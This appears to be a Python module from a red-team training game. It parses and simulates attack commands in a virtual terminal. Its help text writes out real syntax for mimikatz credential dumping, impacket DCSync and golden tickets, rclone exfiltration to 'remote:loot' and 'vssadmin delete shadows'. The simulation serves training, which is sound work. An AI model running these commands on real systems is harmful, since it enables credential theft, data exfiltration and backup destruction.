"""Syntaxes d'outils reconnues dans le monde de jeu et petit système de fichiers virtuel.

Les parsers ne délèguent jamais au shell du système. Une option non implémentée
est signalée comme telle ; aucun succès n'est inventé pour une commande ignorée.
"""
from __future__ import annotations
import posixpath
import shlex
from .models import GameState


def parse(line: str, state: GameState, abilities):
    from .terminal import TerminalResult
    from .game_loop import QueuedAction
    if state.terminal_auth:
        pending=state.terminal_auth
        if pending.get('kind') == 'ldap':
            from .directory_tools import finish
            return finish(state,line)
        if pending.get('kind') == 'ssh-forward':
            from .tunnels import finish
            return finish(state,line)
        if pending.get('kind') == 'mysql':
            from .data_tools import finish_mysql
            return finish_mysql(state,line)
        if pending.get('kind') == 'impacket':
            state.terminal_auth = {}
            args = pending['words'][:]
            index = pending['auth_index']
            identity, ref = args[index].rsplit('@',1)
            args[index] = identity + ':' + line + '@' + ref
            from .terminal import parse as terminal_parse
            return terminal_parse(shlex.join(args), state, abilities)
        if pending.get('kind') == 'scp_download':
            from .deployment import finish_download
            return finish_download(state,line)
        if pending.get('kind') == 'scp':
            from .deployment import finish_scp
            return finish_scp(state, line)
        host=state.hosts.get(pending['host'])
        from .authentication import authenticate
        credential=authenticate(state,host,pending['username'],line)
        if host and host.status!='ISOLATED' and credential and credential.value==line and (credential.username in host.admin_users or credential.username==host.primary_user):
            from .console_sessions import enter
            enter(state, host, credential.username, 'USER')
            if host.status == 'HEALTHY':
                host.status, host.compromised_by, host.access_level = 'COMPROMISED', 'red', 'USER' 
            banner = host.os if host.os.startswith('Windows') else "Last login: simulated session"
            return TerminalResult(True, [banner])
        pending['attempts']+=1
        if pending['attempts']>=3:
            state.terminal_auth={}
            return TerminalResult(False,['Permission denied (publickey,password).'])
        return TerminalResult(False,["Permission denied, please try again.",f"{pending['username']}@{host.ip if host else 'host'}'s password:"])
    try:
        words = shlex.split(line, posix=not bool(state.terminal_host and state.hosts[state.terminal_host].os.startswith("Windows")))
        words = [word[1:-1] if len(word) >= 2 and word[0] == word[-1] == '"' else word for word in words]
    except ValueError as exc:
        return TerminalResult(False, [f"shell: {exc}"])
    if not words:
        return TerminalResult(True)
    tool, args = words[0].lower().removesuffix(".exe"), words[1:]
    if args in (["--help"], ["-h"]) and tool in {"nmap", "hashcat", "rclone", "impacket-psexec", "impacket-secretsdump", "impacket-ticketer"}:
        return help_result([tool], state, abilities)
    current = state.hosts.get(state.terminal_host)
    if current and current.status == "ISOLATED":
        from .console_sessions import disconnect
        disconnect(state)
        return TerminalResult(False, ["Connection closed by remote host."])
    user = state.terminal_user
    files = current.files if current else state.terminal_files
    if tool == "uname":
        # uname, uname -a/-r/-m/-s et id sont servis par system_tools ; seules les autres options arrivent ici.
        return TerminalResult(False, ["uname: arguments non pris en charge par cette version."])
    if tool in {"whoami", "hostname", "pwd"}:
        if args:
            return TerminalResult(False, [f"{tool}: arguments non pris en charge par cette version."])
        values = {"whoami": user, "hostname": current.hostname if current else "redteam", "pwd": state.terminal_cwd}
        return TerminalResult(True, [values[tool]])
    if tool == "ip":
        if args not in (["a"], ["addr"], ["address"], ["addr", "show"]):
            return TerminalResult(False, ["Usage pris en charge : ip addr"])
        return TerminalResult(True, ["1: lo: <LOOPBACK,UP> mtu 65536", "    inet 127.0.0.1/8 scope host lo", "2: eth0: <BROADCAST,MULTICAST,UP> mtu 1500", f"    inet {current.ip if current else '10.10.14.2'}/24 scope global eth0"])
    if tool in {"ls", "dir", "cat", "type", "cd"}:
        opts = [a for a in args if a.startswith('-')]
        if any(o not in {"-l", "-a", "-la", "-al"} for o in opts) or (opts and tool not in {"ls", "dir"}):
            return TerminalResult(False, [f"{tool}: option non prise en charge."])
        paths = [a for a in args if not a.startswith('-')]
        home = state.terminal_env.get("HOME", "/home/operator")
        def path(value):
            if value == "~" or value.startswith("~/"):
                value = home + value[1:]
            return posixpath.normpath(value if value.startswith('/') else posixpath.join(state.terminal_cwd, value))
        if tool in {"cat", "type"}:
            if not paths:
                return TerminalResult(False, [f"{tool}: un fichier est requis dans ce terminal."])
            output = []
            for name in paths:
                resolved = path(name)
                if resolved not in files:
                    return TerminalResult(False, [f"{tool}: {name}: No such file or directory"])
                from .file_access import readable
                if not readable(state,resolved): return TerminalResult(False,[f"{tool}: {name}: Permission denied"])
                output.append(files[resolved])
            return TerminalResult(True, output)
        target = path(paths[0]) if paths else (home if tool == "cd" else state.terminal_cwd)
        from .virtual_files import directories as shared_directories
        directories = shared_directories(state)
        if target not in directories:
            return TerminalResult(False, [f"{tool}: {target}: No such file or directory"])
        if tool == "cd":
            state.terminal_cwd = target
            return TerminalResult(True)
        entries = sorted({p[len(target.rstrip('/')+'/'):].split('/')[0] for p in list(files)+list(directories) if p.startswith(target.rstrip('/')+'/') and p != target})
        if any('l' in option for option in opts):
            entries = [f"{'drwxr-xr-x' if posixpath.join(target,name) in directories else '-rw-r--r--'} 1 {state.terminal_user} {state.terminal_user} {len(files.get(posixpath.join(target,name), '').encode()):>6} {name}" for name in entries]
        return TerminalResult(True, entries)
    if tool in {"exit", "logout"}:
        if state.terminal_host is None and not state.terminal_return_stack:
            # Console Kali locale : rien à quitter, et surtout ne pas effacer ses variables ni son dossier courant.
            return TerminalResult(True, ["logout : aucune session distante à fermer. La console locale reste ouverte."])
        from .console_sessions import leave
        leave(state)
        return TerminalResult(True, ["Connection closed."])

    def action(ability_id, host, credential=None, extra=None):
        if ability_id not in state.available_abilities.get("red", []):
            return TerminalResult(False, [f"{tool}: outil indisponible pour cette mission."])
        if host is None or host.id not in state.discovered:
            return TerminalResult(False, ["Cible inconnue dans le réseau découvert."])
        return TerminalResult(True, [f"{tool}: action en attente…"], QueuedAction(ability_id=ability_id,target_id=host.id,
            credential_username=credential.username if credential else None,credential_type=credential.type if credential else None, params={**(extra or {}), **({'credential_value':credential.value} if credential else {})}, console_id=state.active_terminal_id))
    if tool == "nmap":
        targets, i = [], 0
        while i < len(args):
            value = args[i]
            if value in {"-sV", "-sS", "-sT", "-Pn", "-sn", "-n", "-T0", "-T1", "-T2", "-T3", "-T4", "-T5"}:
                i += 1
                continue
            if value == "-p":
                if i+1 >= len(args):
                    return TerminalResult(False, ["nmap: -p requires a port specification"])
                if not all(p.isdigit() and 1 <= int(p) <= 65535 for p in args[i+1].split(',')):
                    return TerminalResult(False, ["nmap: cette version reconnaît une liste de ports (ex. 22,445)."])
                i += 2
                continue
            if value.startswith('-'):
                return TerminalResult(False, [f"nmap: option {value} non implémentée dans cette version."])
            targets.append(value);i += 1
        if len(targets) != 1:
            return TerminalResult(False, ["Usage pris en charge : nmap [-sV] [-Pn] [-p ports] cible"])
        ref = targets[0]
        host = state.find_host(ref)
        if '/' in ref:
            import ipaddress
            try: network = ipaddress.ip_network(ref, strict=False)
            except ValueError: return TerminalResult(False, ['nmap: Invalid target specification'])
            if network.version != 4 or network.prefixlen != 24: return TerminalResult(False, ['nmap: cette version simule les sous-réseaux IPv4 /24.'])
            prefix = str(network.network_address).rsplit('.',1)[0]+'.'
            host = next((h for h in state.hosts.values() if h.id in state.discovered and h.ip.startswith(prefix)),None)
        return action('red.recon_scan',host,extra={'scan_scope':'subnet' if ref.endswith('/24') else 'host', 'skip_discovery':'-Pn' in args, 'scan_timing':next((int(a[2:]) for a in args if a.startswith('-T')), 3), 'scan_versions':'-sV' in args, 'discovery_only':'-sn' in args, 'scan_ports':[int(p) for p in args[args.index('-p')+1].split(',')] if '-p' in args else []})
    if tool in {"psexec.py", "impacket-psexec", "secretsdump.py", "impacket-secretsdump", "impacket-lookupsid", "lookupsid.py", "ssh"}:
        auth = next((a for a in args if '@' in a and not a.startswith('-')),None)
        if not auth:
            return TerminalResult(False, [f"{tool}: une identité utilisateur@cible est requise."])
        identity, ref = auth.rsplit('@',1)
        account, separator, password = identity.partition(':')
        if '/' in account:
            domain = account.rsplit('/',1)[0].casefold()
            if domain not in {state.domain.get('name', '').casefold(), state.domain.get('name', '').split('.')[0].casefold()}:
                return TerminalResult(False, ['SMB SessionError: STATUS_LOGON_FAILURE (domaine incorrect)'])
        username = account.rsplit('/',1)[-1]
        host = state.find_host(ref)
        if tool=='ssh':
            if separator or '/' in identity or len(args)!=1:
                return TerminalResult(False,['Usage pris en charge : ssh utilisateur@cible (mot de passe demandé ensuite).'])
            if not host or host.id not in state.discovered or host.status=='ISOLATED' or not any(s.port==22 for s in host.services) or state.is_blocked(host.id,22):
                return TerminalResult(False,['ssh: connect to host: Connection refused'])
            state.terminal_auth={'username':username,'host':host.id,'attempts':0}
            return TerminalResult(True,[f"{username}@{host.ip}'s password:"])
        if '-k' in args or '-no-pass' in args:
            if tool not in {'psexec.py', 'impacket-psexec'} or set(args) != {auth, '-k', '-no-pass'}:
                return TerminalResult(False, ['Usage : impacket-psexec -k -no-pass domaine/utilisateur@cible'])
            if ref == (host.ip if host else None):
                return TerminalResult(False, ['Kerberos : utilise le nom du service (hostname découvert), pas son adresse IP.'])
            domain = auth.rsplit('@', 1)[0].split('/', 1)[0]
            filename = state.terminal_env.get('KRB5CCNAME', '')
            if filename and not filename.startswith('/'): filename = posixpath.join(state.terminal_cwd, filename)
            ticket = state.tool_data.get('kerberos', {}).get(filename, {})
            credential = state.find_credential('krbtgt', 'KRBTGT_HASH')
            if ticket.get('expires_minute', float('inf')) <= state.environment.get('world_minute', 0):
                return TerminalResult(False, ['Kerberos SessionError: KRB_AP_ERR_TKT_EXPIRED'])
            if domain != state.domain.get('name') or ticket.get('username') != username or not credential:
                return TerminalResult(False, ['Kerberos SessionError: KRB_AP_ERR_BAD_INTEGRITY (cache absent ou identité incorrecte)'])
            return action('red.psexec_lateral', host, credential, {'kerberos_ticket': filename, 'ticket_user': username})
        allowed = {auth}
        if '-hashes' in args:
            i = args.index('-hashes')
            if i + 1 >= len(args) or args.count('-hashes') != 1:
                return TerminalResult(False, [f"{tool}: -hashes requires one LMHASH:NTHASH argument"])
            allowed.update(['-hashes', args[i + 1]])
        if tool in {'lookupsid.py', 'impacket-lookupsid'}: allowed.add('-domain-sids')
        if tool in {'secretsdump.py', 'impacket-secretsdump'}: allowed.add('-just-dc')
        if any(a not in allowed for a in args):
            return TerminalResult(False, [f"{tool}: option non implémentée dans cette version."])
        if host and host.id not in state.discovered:
            return TerminalResult(False, ['SMB SessionError: STATUS_CONNECTION_DISCONNECTED', f"Cible {ref} non identifiée dans ce dossier : repère-la d’abord avec nmap (par exemple nmap -sV {host.ip})."])
        if not host or host.status in {'ISOLATED', 'ENCRYPTED'} or not host.has_service('SMB', 445) or state.is_blocked(host.id, 445):
            return TerminalResult(False, ['SMB SessionError: STATUS_CONNECTION_DISCONNECTED'])
        from .authentication import authenticate
        if '-hashes' in args:
            i = args.index('-hashes')
            if i+1 >= len(args):
                return TerminalResult(False,[f"{tool}: -hashes requires an argument"])
            given = args[i+1].split(':')[-1]
            cred = authenticate(state,host,username,given,'NTLM_HASH')
        elif separator:
            cred = authenticate(state,host,username,password)
        else:
            state.terminal_auth = {'kind':'impacket','words':words,'auth_index':words.index(auth),'username':username,'host':host.id if host else '', 'attempts':0}
            return TerminalResult(True,['Password:'])
        if cred is None:
            return TerminalResult(False,[f"{tool}: authentication failed (aucun identifiant correspondant)."])
        if tool in {'lookupsid.py', 'impacket-lookupsid'}:
            if not host.is_domain_controller or '-domain-sids' not in args:
                return TerminalResult(False, ['Cette version reconnaît -domain-sids sur le contrôleur du domaine.'])
            state.tool_data.setdefault('recon', {})['domain'] = dict(state.domain)
            return TerminalResult(True, ['[*] Domain SID is: ' + state.domain.get('sid', ''), 'Domain: ' + state.domain.get('name', '')])
        return action('red.dcsync' if 'secretsdump' in tool else 'red.psexec_lateral',host,cred)
    if tool in {'ticketer.py','impacket-ticketer'}:
        options = args[:]
        hours = 87600
        if '-duration' in options:
            at = options.index('-duration')
            if at + 1 >= len(options) or not options[at + 1].isdigit() or not 1 <= int(options[at + 1]) <= 876000:
                return TerminalResult(False, ['ticketer: -duration requires hours between 1 and 876000 in this version'])
            hours = int(options[at + 1]); del options[at:at + 2]
        if len(options)!=7 or options[0]!='-nthash' or options[2]!='-domain-sid' or options[4]!='-domain':
            return TerminalResult(False,['Usage pris en charge : impacket-ticketer -nthash HASH -domain-sid SID -domain DOMAINE [-duration heures] utilisateur'])
        args = options
        credential=state.find_credential('krbtgt','KRBTGT_HASH')
        if credential is None or args[1]!=credential.value:
            return TerminalResult(False,['ticketer: secret krbtgt inconnu ou incorrect.'])
        if args[3]!=state.domain.get('sid') or args[5]!=state.domain.get('name'):
            return TerminalResult(False,['ticketer: le SID ou le domaine ne correspond pas aux informations découvertes.'])
        host=next((h for h in state.hosts.values() if h.id in state.discovered and h.is_domain_controller),None)
        return action('red.golden_ticket',host,credential,{'ticket_user':args[6], 'ticket_hours':hours})
    if tool == 'mimikatz' and any('sekurlsa::logonpasswords' in a for a in args):
        if current is None or state.terminal_access!='SYSTEM' or current.status!='COMPROMISED':
            return TerminalResult(False,['ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)'])
        if any(a not in {'privilege::debug','sekurlsa::logonpasswords','exit'} for a in args):
            return TerminalResult(False,['mimikatz: sous-commande non implémentée dans cette version.'])
        return action('red.mimikatz_dump',current,state.find_credential(user))
    if tool == 'hashcat':
        from .hashcat_model import parse as hashcat_parse
        return hashcat_parse(args, state)
    if tool == 'rclone' and args and args[0]=='copy':
        if len(args)!=3 or args[2]!='remote:loot':
            return TerminalResult(False,['Usage pris en charge : rclone copy /srv remote:loot'])
        from .virtual_shell import virtual_path
        if virtual_path(args[1], state.terminal_cwd) != '/srv' or current is None:
            return TerminalResult(False,['rclone: directory not found: /srv'])
        return action('red.exfiltrate',current,extra={'files':[name for name in current.files if name.startswith('/srv/')]})
    return None


def output(ability_id: str, state: GameState, ctx) -> str:
    if ability_id=='red.recon_scan':
        lines=[]
        for host in state.hosts.values():
            if host.id not in state.discovered:continue
            if ctx.params.get('scan_scope')=='host' and host.id!=ctx.target.id:continue
            if not host.ip.startswith(ctx.target.ip.rsplit('.',1)[0]+'.'):continue
            lines += [f'Nmap scan report for {(state.dns_names(host.id) or [host.hostname])[0]} ({host.ip})']
            if host.status == 'ISOLATED' and not ctx.params.get('skip_discovery'):
                lines.append('Host seems down. If it is really up, but blocking our ping probes, try -Pn.')
                continue
            lines.append('Host is up.' if host.status != 'ISOLATED' else 'Host discovery disabled (-Pn).')
            if ctx.params.get('discovery_only'): continue
            versions = ctx.params.get('scan_versions', False)
            lines.append('PORT     STATE SERVICE' + (' VERSION' if versions else ''))
            selected = ctx.params.get('scan_ports') or [service.port for service in host.services]
            services = {s.port:s for s in host.services}
            common = {22:'ssh',80:'http',88:'kerberos-sec',135:'msrpc',389:'ldap',443:'https',445:'microsoft-ds'}
            observations = []
            for port in sorted(selected):
                service = services.get(port)
                status = 'filtered' if host.status == 'ISOLATED' or state.is_blocked(host.id,port) else ('open' if service else 'closed')
                name = service.name.lower() if service else common.get(port,'unknown')
                version = '  ' + service.version if status == 'open' and versions and service and service.version else ''
                lines.append(f'{port}/tcp  {status}  {name}{version}')
                observations.append({'name': service.name if status == 'open' and service else common.get(port, 'unknown'), 'port': port, 'state': status, 'version': service.version if status == 'open' and versions and service else ''})
            state.tool_data.setdefault('recon', {}).setdefault('observations', {})[host.id] = {'tick': state.tick, 'source': state.terminal_host or 'operator', 'services': observations}
        return '\n'.join(lines)
    if ability_id in {'red.mimikatz_dump','red.phishing_initial_access','red.dcsync'}:
        lines=[]
        for cred in state.loot:
            if cred.source_host!=ctx.target.id:continue
            lines.append(f'{cred.username} : {cred.type} : {cred.value}')
            if cred.type=='NTLM_HASH':state.terminal_files[f'/home/operator/loot/{cred.username}.ntlm']=cred.value
        return '\n'.join(lines)
    if ability_id=='red.crack_hash':
        matches = ctx.params.get('crack_matches')
        if matches is not None:
            complete = all(value in matches for value in ctx.params.get('hashes', []))
            return 'Status...........: ' + ('Cracked' if complete else 'Exhausted') + '\n' + '\n'.join(value+':'+password for value,password in matches.items())
        cred=state.find_credential(ctx.credential.username,'PLAINTEXT') if ctx.credential else None
        return f'Status...........: Cracked\n{cred.username}:{cred.value}' if cred else 'Status...........: Exhausted'
    if ability_id=='red.psexec_lateral':
        from .console_sessions import enter
        enter(state, ctx.target, ctx.params.get('ticket_user', ctx.credential.username), 'SYSTEM')
        return '[*] Service started\nMicrosoft Windows [Version 10.0]'
    if ability_id=='red.golden_ticket':return '[*] Saving ticket in ' + ctx.params.get('ticket_user', 'administrator') + '.ccache\nTicket créé hors ligne ; aucun accès distant encore vérifié.'
    if ability_id=='red.exfiltrate':return f"Transferred: {len(ctx.params.get('files', ctx.target.files))} files, 100%"
    return ''


HELP = {
    "red.recon_scan": ("nmap", "nmap [-sV] [-Pn] [-sn] [-p ports] cible[/24]", "Découverte ou scan des services dans le réseau simulé."),
    "red.phishing_initial_access": ("gophish", "gophish --config /opt/gophish/config.json", "Serveur au premier plan. Dans une autre console : cat ~/gophish/README.txt pour piloter son API avec curl."),
    "red.mimikatz_dump": ("mimikatz", 'mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit', "Transfère d’abord ~/tools/mimikatz.exe vers C:\\Tools, puis utilise une session SYSTEM. Guide : cat ~/tools/README.txt."),
    "red.psexec_lateral": ("psexec", "impacket-psexec [domaine/]utilisateur[:mot_de_passe]@cible", "Sans mot de passe dans la commande : invite Password: dans cette console. Option -hashes LM:NT pour un identifiant NTLM récupéré."),
    "red.dcsync": ("secretsdump", "impacket-secretsdump -just-dc [domaine/]utilisateur:mot_de_passe@cible", "Option -hashes LM:NT également prise en charge."),
    "red.crack_hash": ("hashcat", "hashcat -m 1000 ~/loot/utilisateur.ntlm /usr/share/wordlists/rockyou.txt", "Mode 1000 : NTLM ; mode 13100 : tickets Kerberos RC4 fournis par le laboratoire. --show lit le potfile. La durée NTLM dépend du matériel simulé ; le mode 13100 actuel est résolu hors ligne immédiatement."),
    "red.exfiltrate": ("rclone", "rclone copy /srv remote:loot", "Transfère ~/tools/rclone.exe vers C:\\Tools avant utilisation ; remote:loot est préconfiguré sur les images du laboratoire."),
    "red.golden_ticket": ("ticketer", "impacket-ticketer -nthash HASH -domain-sid SID -domain DOMAINE utilisateur", "Crée un ccache hors ligne. Ensuite : export KRB5CCNAME=~/administrator.ccache, puis impacket-psexec -k -no-pass domaine/administrator@controleur."),
    "red.encrypt": ("vesper", "vesper encrypt", "Programme fictif : session distante administrateur et affiliation requises."),
    "red.destroy_backups": ("backups", "vssadmin delete shadows /all /quiet", "Commande Windows, résolue sur la session distante administrateur."),
}


def help_result(args, state, abilities):
    from .terminal import TerminalResult
    from .text_commands import TOOLS, parse as text_help
    extended = {
        'ldapsearch': 'ldapsearch -x -H ldap://controleur -D utilisateur@domaine -W -b base "(filtre=valeur)" [attributs]',
        'impacket-GetUserSPNs': 'impacket-GetUserSPNs domaine/utilisateur:secret -dc-ip adresse [-request -outputfile fichier]',
        'sharphound': 'SharpHound.exe --CollectionMethods Group,ObjectProps --OutputDirectory chemin --ZipFileName collecte.zip',
        'ssh': 'ssh utilisateur@cible | ssh -N -L port_local:hote_interne:port_distant utilisateur@relais',
        'systeminfo': 'systeminfo', 'whoami': 'whoami [/all | /user | /groups | /priv]',
        'sudo': 'sudo -l', 'dpkg-query': 'dpkg-query -W [paquet]', 'pkexec': 'pkexec --version',
        'getcap': 'getcap -r /', 'stat': 'stat fichier', 'systemctl': 'systemctl status service | systemctl list-units',
    }
    if args and args[0] in extended:return TerminalResult(True,[extended[args[0]],'La sortie dépend de la machine, des droits et de la connexion courante.'])
    if args and args[0]=='tar':
        from .archive_tools import parse as archive_help
        return archive_help('tar --help',state)
    if args and args[0] in {'sqlmap','mysql','sqlite3'}:
        from .data_tools import parse as data_help
        return data_help(args[0]+' --help',state,abilities)
    if args and args[0] in {'nc','checksec','gdb','python3'}:
        from .service_lab import parse as lab_help
        return lab_help(args[0]+' --help',state,abilities)
    if args and args[0] in TOOLS:
        if state.terminal_host and state.hosts[state.terminal_host].os.startswith('Windows'):
            return TerminalResult(False, ['Ces filtres sont installés dans Kali ; utilise une console locale.'])
        return text_help(args[0]+' --help',state,abilities)
    available = [HELP[i] for i in state.available_abilities.get('red',[]) if i in HELP]
    if args and args[0] in {'impacket-lookupsid', 'lookupsid.py', 'lookupsid'}:
        return TerminalResult(True, ['usage : impacket-lookupsid -domain-sids [-hashes LM:NT] domaine/utilisateur[:mot_de_passe]@controleur', 'Interroge le SID du domaine avec un identifiant valide ; aucun secret de réplication n’est renvoyé.'])
    if args:
        aliases={'impacket-psexec':'psexec','psexec.py':'psexec','impacket-secretsdump':'secretsdump','secretsdump.py':'secretsdump','vssadmin':'backups','impacket-ticketer':'ticketer'}
        tool=aliases.get(args[0],args[0])
        found=[entry for entry in available if entry[0]==tool]
        if not found:return TerminalResult(False,[f'{tool}: outil inconnu ou indisponible.'])
        lines=[]
        for name,usage,description in found:
            # Une cible seule reste une syntaxe authentique de nmap.
            lines += [f'usage : {"nmap {target}" if name=="nmap" else usage}',usage,description]
        return TerminalResult(True,lines)
    lines=['Terminal simulé — syntaxes prises en charge :','  Kali : whoami · hostname · id · uname -a · ip addr · pwd · ls · cd · cat · exit', '  Windows : whoami · hostname · ver · ipconfig · cd · dir · type · exit','  ssh utilisateur@cible · scp source utilisateur@cible:chemin', '  smbclient //cible/C$ -U utilisateur%secret -c commande', '  cat ~/tools/README.txt','  hosts · loot · help [outil] · clear', '  ls /usr/bin · which gophish · gophish --help', '  impacket-lookupsid -domain-sids utilisateur:mot_de_passe@controleur', '  cat ~/gophish/README.txt · curl · echo · export · jobs · kill', '  grep · head · tail · wc · cut · sort · uniq · sha256sum ; pipes | et redirections > >>', '  sqlmap · sqlite3 · mysql ; help outil pour les options du laboratoire', '  nc · checksec · gdb · python3 script de laboratoire fourni']
    lines += ['  '+usage for _,usage,_ in available]
    return TerminalResult(True,lines)
